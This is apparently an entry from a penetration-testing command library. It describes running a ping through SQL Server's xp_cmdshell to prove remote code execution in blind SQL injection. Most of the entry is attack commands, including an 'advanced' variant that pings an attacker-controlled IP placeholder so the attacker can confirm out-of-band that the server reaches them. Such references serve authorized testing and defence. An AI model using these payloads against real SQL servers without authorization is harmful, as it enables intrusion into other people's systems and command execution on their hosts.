---
data: EXEC xp_cmdshell 'ping -n 1 127.0.0.1';
tags:
  - rce
  - sql
type: command
output: 'Command executed successfully, ping response indicating RCE.'
executor: sql
platforms:
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:48.558Z'
id: 1c0e66cc-2ad4-4a2f-a46f-7010f439ed34
verified: false
validated: true
submitted: true
---
# execute-sql-ping-via-xp_cmdshell

## Command

```sql
EXEC xp_cmdshell 'ping -n 1 127.0.0.1';
```

## Description

This SQL command executes a safe ping via xp_cmdshell to demonstrate remote code execution capability on the SQL Server host without causing harm. Used in blind SQLi contexts to prove OS command execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `ping -n 1 127.0.0.1` | Ping command with 1 attempt to localhost; replace IP for external verification | Yes |

## Examples

### Basic Usage

```sql
EXEC xp_cmdshell 'ping -n 1 127.0.0.1';
```

### Advanced Usage

```sql
DECLARE @result INT; EXEC @result = xp_cmdshell 'ping -n 1 attacker-controlled-ip'; SELECT @result AS Output;
```

## Expected Output

Successful execution returns 0 or the command's exit code; external ping confirms reachability from server to attacker, validating RCE.

## Related

- [[Related Procedure]]
